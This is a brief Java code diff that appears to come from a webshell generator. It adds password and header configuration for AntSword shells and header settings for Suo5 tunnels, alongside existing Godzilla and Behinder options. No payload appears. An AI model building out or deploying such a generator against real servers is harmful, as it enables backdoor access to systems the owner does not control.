@@ -22,6 +22,7 @@ public class GenerateRequest {
         private String godzillaKey;
         private String commandParamName;
         private String behinderPass;
+        private String antSwordPass;
         private String headerName;
         private String headerValue;
     }
@@ -47,6 +48,12 @@ public class GenerateRequest {
                     .build();
             case Suo5 -> Suo5Config.builder()
                     .shellClassName(shellToolConfig.getShellClassName())
+                    .headerName(shellToolConfig.getHeaderName())
+                    .headerValue(shellToolConfig.getHeaderValue())
+                    .build();
+            case AntSword ->  AntSwordConfig.builder()
+                    .shellClassName(shellToolConfig.getShellClassName())
+                    .pass(shellToolConfig.getAntSwordPass())
                     .headerName(shellToolConfig.getHeaderName())
                     .headerValue(shellToolConfig.getHeaderValue())
                     .build();
